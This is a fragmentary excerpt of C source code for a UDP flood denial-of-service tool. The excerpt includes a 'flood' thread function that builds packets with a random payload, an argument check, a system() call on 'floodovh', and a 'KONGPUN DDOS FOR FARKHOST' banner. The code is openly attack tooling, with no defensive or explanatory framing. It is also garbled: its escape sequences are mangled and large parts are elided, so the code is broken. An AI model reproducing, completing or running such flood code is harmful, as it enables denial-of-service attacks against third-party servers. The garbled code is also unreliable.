...
void *flood(void *par1)
{
	...
	size = rand()%255;
	init_rand(time(NULL));
	memcpy((void *)udph + sizeof(struct udphdr), "\rand()%xff\rand()%xff\rand()%xff\rand()%xff\rand()%x67\rand()%x65\rand()%x74\rand()%x73\rand()%x74\rand()%x61\rand()%x74\rand()%x75\rand()%x73\rand()%x0a" ,size);
    ...
    {
	printf(KGREEN "KONGPUN DDOS FOR FARKHOST RANDOM SUPORT '\n" RESET);
      if(argc < 5 || argc > 5){
...
system(floodovh);
	...
	fprintf(stdout, "KONGPUN DDOS FOR FARKHOST RANDOM..\n"); 
	  int i;
